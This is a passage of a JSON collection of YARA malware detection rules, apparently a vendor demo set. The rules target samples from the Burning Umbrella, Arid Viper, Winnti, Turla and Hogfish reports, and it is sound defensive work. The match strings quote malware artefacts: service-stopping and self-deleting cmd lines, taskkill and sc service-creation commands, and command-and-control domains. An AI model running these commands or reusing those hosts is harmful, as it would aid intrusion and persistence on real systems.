report","minimum_yara":"1.7","name":"MAL_BurningUmbrella_Sample_8_RID31AB","reference":"https://401trg.pw/burning-umbrella/","required_modules":[],"rule_hash":"04da79743f549ff8d1bcf6ee9387eb12","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_BurningUmbrella_Sample_10_RID31D4 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:39:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"revjj.syshell.org\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}","date":"2018-05-04 13:39:11","description":"Detects malware sample from Burning Umbrella report","minimum_yara":"1.7","name":"MAL_BurningUmbrella_Sample_10_RID31D4","reference":"https://401trg.pw/burning-umbrella/","required_modules":[],"rule_hash":"658870bf26737675844b2a3bccf387d6","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_BurningUmbrella_Sample_11_RID31D5 : APT DEMO FILE {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:39:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Resume.app/Contents/Java/Resume.jarPK\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and filesize < 700KB and 1 of them\n}","date":"2018-05-04 13:39:21","description":"Detects malware sample from Burning Umbrella report","minimum_yara":"1.7","name":"MAL_BurningUmbrella_Sample_11_RID31D5","reference":"https://401trg.pw/burning-umbrella/","required_modules":[],"rule_hash":"69afaca58ccf27456c8ef44b173e4d08","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule MAL_BurningUmbrella_Sample_13_RID31D7 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:39:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and pe.imphash ( ) == \"75f201aa8b18e1c4f826b2fe0963b84f\"\n}","date":"2018-05-04 13:39:41","description":"Detects malware sample from Burning Umbrella report","minimum_yara":"1.7","name":"MAL_BurningUmbrella_Sample_13_RID31D7","reference":"https://401trg.pw/burning-umbrella/","required_modules":["pe"],"rule_hash":"bbb081fb951dc8ac72d7b2a1362b199c","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_BurningUmbrella_Sample_14_RID31D8 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:39:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\tmp\\\\Google_updata.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and 1 of them\n}","date":"2018-05-04 13:39:51","description":"Detects malware sample from Burning Umbrella report","minimum_yara":"1.7","name":"MAL_BurningUmbrella_Sample_14_RID31D8","reference":"https://401trg.pw/burning-umbrella/","required_modules":[],"rule_hash":"5d753222adbc97c18c25414108ca6604","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_BurningUmbrella_Sample_15_RID31D9 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:40:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and pe.imphash ( ) == \"cc33b1500354cf785409a3b428f7cd2a\"\n}","date":"2018-05-04 13:40:01","description":"Detects malware sample from Burning Umbrella report","minimum_yara":"1.7","name":"MAL_BurningUmbrella_Sample_15_RID31D9","reference":"https://401trg.pw/burning-umbrella/","required_modules":["pe"],"rule_hash":"07d846366bd5aeb95c60366d46263d41","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_BurningUmbrella_Sample_16_RID31DA : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:40:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://netimo.net 0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them\n}","date":"2018-05-04 13:40:11","description":"Detects malware sample from Burning Umbrella report","minimum_yara":"1.7","name":"MAL_BurningUmbrella_Sample_16_RID31DA","reference":"https://401trg.pw/burning-umbrella/","required_modules":[],"rule_hash":"a865d4418e209dd111e300d738bc4298","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_BurningUmbrella_Sample_1_RID31A4 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:31:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = { 40 00 00 E0 75 68 66 61 6F 68 6C 79 } \n      $s2 = { 40 00 00 E0 64 6A 7A 66 63 6D 77 62 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and ( pe.imphash ( ) == \"baa93d47220682c04d92f7797d9224ce\" and $s1 in ( 0 .. 1024 ) and $s2 in ( 0 .. 1024 ) )\n}","date":"2018-05-04 13:31:11","description":"Detects malware sample from Burning Umbrella report","minimum_yara":"1.7","name":"MAL_BurningUmbrella_Sample_1_RID31A4","reference":"https://401trg.pw/burning-umbrella/","required_modules":["pe"],"rule_hash":"bdbf80b5431a5baa6eb44e9b0a22bab0","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_BurningUmbrella_Sample_2_RID31A5 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:31:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = { 40 00 00 E0 63 68 72 6F 6D 67 75 78 } \n      $s2 = { 40 00 00 E0 77 62 68 75 74 66 6F 61 } \n      $s3 = \"ActiveX Manager\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and $s1 in ( 0 .. 1024 ) and $s2 in ( 0 .. 1024 ) and $s3\n}","date":"2018-05-04 13:31:21","description":"Detects malware sample from Burning Umbrella report","minimum_yara":"1.7","name":"MAL_BurningUmbrella_Sample_2_RID31A5","reference":"https://401trg.pw/burning-umbrella/","required_modules":[],"rule_hash":"3690db10a9e00a260a0e762adfd50404","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_BurningUmbrella_Sample_4_RID31A7 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:31:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"dumpodbc.exe\" fullword ascii\n      $x2 = \"photo_Bundle.exe\" fullword ascii\n      $x3 = \"Connect 2 fails : %d,%s:%d\" fullword ascii\n      $x4 = \"Connect fails 1 : %d %s:%d\" fullword ascii\n      $x5 = \"New IP : %s,New Port: %d\" fullword ascii\n      $x6 = \"Micrsoft Corporation. All rights reserved.\" fullword wide\n      $x7 = \"New ConFails : %d\" fullword ascii\n      $s1 = \"cmd /c net stop stisvc\" fullword ascii\n      $s2 = \"cmd /c net stop spooler\" fullword ascii\n      $s3 = \"\\\\temp\\\\s%d.dat\" fullword ascii\n      $s4 = \"cmd /c net stop wuauserv\" fullword ascii\n      $s5 = \"User-Agent: MyApp/0.1\" fullword ascii\n      $s6 = \"%s->%s Fails : %d\" fullword ascii\n      $s7 = \"Enter WorkThread,Current sock:%d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and ( ( pe.exports ( \"Print32\" ) and 2 of them ) or 1 of ( $x* ) or 4 of them )\n}","date":"2018-05-04 13:31:41","description":"Detects malware sample from Burning Umbrella report","minimum_yara":"1.7","name":"MAL_BurningUmbrella_Sample_4_RID31A7","reference":"https://401trg.pw/burning-umbrella/","required_modules":["pe"],"rule_hash":"2f499349fbd85f3855aef0f29fe176ee","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_BurningUmbrella_Sample_6_RID31A9 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:32:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ExecuteFile=\\\"hidcon:nowait:\\\\\\\"Word\\\\\\\\r.bat\\\\\\\"\\\"\" fullword ascii\n      $s2 = \"InstallPath=\\\"%Appdata%\\\\\\\\Microsoft\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them\n}","date":"2018-05-04 13:32:01","description":"Detects malware sample from Burning Umbrella report","minimum_yara":"1.7","name":"MAL_BurningUmbrella_Sample_6_RID31A9","reference":"https://401trg.pw/burning-umbrella/","required_modules":[],"rule_hash":"2b26bc328fd1bfb10ed764147b049d71","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_BurningUmbrella_Sample_12_RID31D6 : APT DEMO EXE FILE T1050 T1085 {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:39:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1050, T1085\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%SystemRoot%\\\\System32\\\\qmgr.dll\" fullword ascii\n      $s2 = \"rundll32.exe %s,Startup\" fullword ascii\n      $s3 = \"nvsvcs.dll\" fullword wide\n      $s4 = \"SYSTEM\\\\CurrentControlSet\\\\services\\\\BITS\\\\Parameters\" fullword ascii\n      $s5 = \"http://www.sginternet.net 0\" fullword ascii\n      $s6 = \"Microsoft Corporation. All rights reserved.\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 80KB and ( pe.exports ( \"SvcServiceMain\" ) and 5 of them )\n}","date":"2018-05-04 13:39:31","description":"Detects malware sample from Burning Umbrella report","minimum_yara":"1.7","name":"MAL_BurningUmbrella_Sample_12_RID31D6","reference":"https://401trg.pw/burning-umbrella/","required_modules":["pe"],"rule_hash":"5fe6c422dfc8fa02b01be7b774f34256","score":75,"tags":["T1050","DEMO","FILE","APT","T1085","EXE"]},{"author":"Florian Roth","content":"rule MAL_BurningUmbrella_Sample_17_RID31DB : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:40:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"syshell\" fullword wide\n      $s2 = \"Normal.dotm\" fullword ascii\n      $s3 = \"Microsoft Office Word\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}","date":"2018-05-04 13:40:21","description":"Detects malware sample from Burning Umbrella report","minimum_yara":"1.7","name":"MAL_BurningUmbrella_Sample_17_RID31DB","reference":"https://401trg.pw/burning-umbrella/","required_modules":[],"rule_hash":"050d629779c91d397321d07f41625374","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_BurningUmbrella_Sample_18_RID31DC : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:40:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"c:\\\\tmp\\\\tran.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == \"11675b4db0e7df7b29b1c1ef6f88e2e1\" or pe.imphash ( ) == \"364e1f68e2d412db34715709c68ba467\" or pe.exports ( \"deKernel\" ) or 1 of them )\n}","date":"2018-05-04 13:40:31","description":"Detects malware sample from Burning Umbrella report","minimum_yara":"1.7","name":"MAL_BurningUmbrella_Sample_18_RID31DC","reference":"https://401trg.pw/burning-umbrella/","required_modules":["pe"],"rule_hash":"bddf113c4b8fe5d618b32e4194cbdcbf","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_BurningUmbrella_Sample_19_RID31DD : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:40:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Cryption.dll\" fullword ascii\n      $s2 = \"tran.exe\" fullword ascii\n      $s3 = \"Kernel.dll\" fullword ascii\n      $s4 = \"Now ready to get the file %s!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 3 of them\n}","date":"2018-05-04 13:40:41","description":"Detects malware sample from Burning Umbrella report","minimum_yara":"1.7","name":"MAL_BurningUmbrella_Sample_19_RID31DD","reference":"https://401trg.pw/burning-umbrella/","required_modules":[],"rule_hash":"e1030c17aefa7bb1944c95dacd03eaac","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_BurningUmbrella_Sample_20_RID31D5 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:39:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Wordpad.Document.1\\\\shell\\\\open\\\\command\\\\\" fullword wide\n      $s2 = \"%s\\\\shell\\\\Open\\\\command\" fullword wide\n      $s3 = \"expanding computer\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == \"bac338bfe2685483c201e15eae4352d5\" or 2 of them )\n}","date":"2018-05-04 13:39:21","description":"Detects malware sample from Burning Umbrella report","minimum_yara":"1.7","name":"MAL_BurningUmbrella_Sample_20_RID31D5","reference":"https://401trg.pw/burning-umbrella/","required_modules":["pe"],"rule_hash":"f5fd49c2de9e3a74d3c4257d1c34dc80","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_BurningUmbrella_Sample_21_RID31D6 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:39:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"c:\\\\windows\\\\ime\\\\setup.exe\" fullword ascii\n      $s2 = \"ws.run \\\"later.bat /start\\\",0Cet \" fullword ascii\n      $s3 = \"del later.bat\" fullword ascii\n      $s4 = \"mycrs.xls\" fullword ascii\n      $a1 = \"-el -s2 \\\"-d%s\\\" \\\"-p%s\\\" \\\"-sp%s\\\"\" fullword ascii\n      $a2 = \"<set ws=wscript.createobject(\\\"wscript.shell\\\")\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 2 of them\n}","date":"2018-05-04 13:39:31","description":"Detects malware sample from Burning Umbrella report","minimum_yara":"1.7","name":"MAL_BurningUmbrella_Sample_21_RID31D6","reference":"https://401trg.pw/burning-umbrella/","required_modules":[],"rule_hash":"417a1c1b3da72756687419512131114e","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_BurningUmbrella_Sample_22_RID31D7 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 13:39:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\\" fullword ascii\n      $s3 = \"Content-Disposition: form-data; name=\\\"txt\\\"; filename=\\\"\" fullword ascii\n      $s4 = \"Fail To Enum Service\" fullword ascii\n      $s5 = \"Host Power ON Time\" fullword ascii\n      $s6 = \"%d Hours %2d Minutes %2d Seconds \" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 4 of them\n}","date":"2018-05-04 13:39:41","description":"Detects malware sample from Burning Umbrella report","minimum_yara":"1.7","name":"MAL_BurningUmbrella_Sample_22_RID31D7","reference":"https://401trg.pw/burning-umbrella/","required_modules":[],"rule_hash":"3c8bcbddb3dc7f12dbf45f4ad73307a3","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_AirdViper_Sample_Apr18_1_RID310C : APT DEMO EXE FILE MIDDLE_EAST {\n   meta:\n      description = \"Detects Arid Viper malware sample\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-05-04 13:05:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \\\"%s\\\"\" fullword ascii\n      $x2 = \"daenerys=%s&\" ascii\n      $x3 = \"betriebssystem=%s&anwendung=%s&AV=%s\" ascii\n      $s1 = \"Taskkill /IM  %s /F &  %s\" fullword ascii\n      $s2 = \"/api/primewire/%s/requests/macKenzie/delete\" fullword ascii\n      $s3 = \"\\\\TaskWindows.exe\" ascii\n      $s4 = \"MicrosoftOneDrives.exe\" fullword ascii\n      $s5 = \"\\\\SeanSansom.txt\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and ( 1 of ( $x* ) or 4 of them )\n}","date":"2018-05-04 13:05:51","description":"Detects Arid Viper malware sample","minimum_yara":"1.7","name":"MAL_AirdViper_Sample_Apr18_1_RID310C","reference":"Internal Research","required_modules":[],"rule_hash":"a3b09a463ab2bdcfe778e6d55856c74b","score":75,"tags":["APT","DEMO","EXE","FILE","MIDDLE_EAST"]},{"author":"Florian Roth","content":"rule MAL_Winnti_Sample_May18_1_RID3003 : APT CHINA DEMO EXE FILE GEN {\n   meta:\n      description = \"Detects malware sample from Burning Umbrella report - Generic Winnti Rule\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 12:21:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"wireshark\" fullword wide\n      $s2 = \"procexp\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}","date":"2018-05-04 12:21:41","description":"Detects malware sample from Burning Umbrella report - Generic Winnti Rule","minimum_yara":"1.7","name":"MAL_Winnti_Sample_May18_1_RID3003","reference":"https://401trg.pw/burning-umbrella/","required_modules":[],"rule_hash":"eb999bc4b55a5487d3737e3362bfb272","score":75,"tags":["DEMO","FILE","APT","CHINA","GEN","EXE"]},{"author":"Florian Roth","content":"rule MAL_Visel_Sample_May18_1_RID2F8D : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects Visel malware sample from Burning Umbrella report\"\n      author = \"Florian Roth\"\n      reference = \"https://401trg.pw/burning-umbrella/\"\n      date = \"2018-05-04 12:02:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"print32.dll\" fullword ascii\n      $s3 = \"c:\\\\a\\\\b.txt\" fullword ascii\n      $s4 = \"\\\\temp\\\\s%d.dat\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.exports ( \"szFile\" ) or 2 of them )\n}","date":"2018-05-04 12:02:01","description":"Detects Visel malware sample from Burning Umbrella report","minimum_yara":"1.7","name":"MAL_Visel_Sample_May18_1_RID2F8D","reference":"https://401trg.pw/burning-umbrella/","required_modules":["pe"],"rule_hash":"3df895c601e021b54890e18c8707549c","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule MAL_Turla_Sample_May18_1_RID2F92 : DEMO EXE FILE MAL RUSSIA {\n   meta:\n      description = \"Detects Turla samples\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/omri9741/status/991942007701598208\"\n      date = \"2018-05-03 12:02:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"sc %s create %s binPath= \\\"cmd.exe /c start %%SystemRoot%%\\\\%s\\\">>%s\" fullword ascii\n      $x2 = \"cmd.exe /c start %%SystemRoot%%\\\\%s\" fullword ascii\n      $x3 = \"cmd.exe /c %s\\\\%s -s %s:%s:%s -c \\\"%s %s /wait 1\\\">>%s\" fullword ascii\n      $x4 = \"Read InjectLog[%dB]********************************\" fullword ascii\n      $x5 = \"%s\\\\System32\\\\011fe-3420f-ff0ea-ff0ea.tmp\" fullword ascii\n      $x6 = \"**************************** Begin ini %s [%d]***********************************************\" fullword ascii\n      $x7 = \"%s -o %s -i %s -d exec2 -f %s\" fullword ascii\n      $x8 = \"Logon to %s failed: code %d(User:%s,Pass:%s)\" fullword ascii\n      $x9 = \"system32\\\\dxsnd32x.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 1 of them\n}","date":"2018-05-03 12:02:51","description":"Detects Turla samples","minimum_yara":"1.7","name":"MAL_Turla_Sample_May18_1_RID2F92","reference":"https://twitter.com/omri9741/status/991942007701598208","required_modules":[],"rule_hash":"6d0ba27773679cbf2fc67f5821a7f666","score":75,"tags":["DEMO","RUSSIA","EXE","FILE","MAL"]},{"author":"Florian Roth, Markus Neis","content":"rule SUSP_Bad_PDF_RID2AFB : DEMO FILE SUSP {\n   meta:\n      description = \"Detects PDF that embeds code to steal NTLM hashes\"\n      author = \"Florian Roth, Markus Neis\"\n      reference = \"Internal Research\"\n      date = \"2018-05-03 08:47:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"         /F (http//\" ascii\n      $s2 = \"        /F (\\\\\\\\\\\\\\\\\" ascii\n      $s3 = \"<</F (\\\\\\\\\" ascii\n   condition: \n      ( uint32 ( 0 ) == 0x46445025 or uint32 ( 0 ) == 0x4450250a ) and 1 of them\n}","date":"2018-05-03 08:47:01","description":"Detects PDF that embeds code to steal NTLM hashes","minimum_yara":"1.7","name":"SUSP_Bad_PDF_RID2AFB","reference":"Internal Research","required_modules":[],"rule_hash":"e31e105385471c2664b7c061aedac9cf","score":60,"tags":["SUSP","DEMO","FILE"]},{"author":"Florian Roth","content":"rule MAL_Hogfish_Report_Related_Sample_RID33CE : APT CHINA DEMO EXE FILE {\n   meta:\n      description = \"Detects APT10 / Hogfish related samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.accenture.com/t20180423T055005Z__w__/se-en/_acnmedia/PDF-76/Accenture-Hogfish-Threat-Analysis.pdf\"\n      date = \"2018-05-01 15:03:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"R=user32.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( pe.imphash ( ) == \"efad9ff8c0d2a6419bf1dd970bcd806d\" or 1 of them )\n}","date":"2018-05-01 15:03:31","description":"Detects APT10 / Hogfish related samples","minimum_yara":"1.7","name":"MAL_Hogfish_Report_Related_Sample_RID33CE","reference":"https://www.accenture.com/t20180423T055005Z__w__/se-en/_acnmedia/PDF-76/Accenture-Hogfish-Threat-Analysis.pdf","required_modules":["pe"],"rule_hash":"d6d4b5dff8b5f73cf6fc3e0bcd275e7e","score":75,"tags":["APT","DEMO","EXE","CHINA","FILE"]},{"author":"Florian Roth","content":"rule MAL_RedLeaves_Apr18_1_RID2E40 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects RedLeaves malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.accenture.com/t20180423T055005Z__w__/se-en/_acnmedia/PDF-76/Accenture-Hogfish-Threat-Analysis.pdf\"\n      date = \"2018-05-01 11:06:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( pe.imphash ( ) == \"7a861cd9c495e1d950a43cb708a22985\" or pe.imphash ( ) == \"566a7a4ef613a797389b570f8b4f79df\" )\n}","date":"2018-05-01 11:06:31","description":"Detects RedLeaves 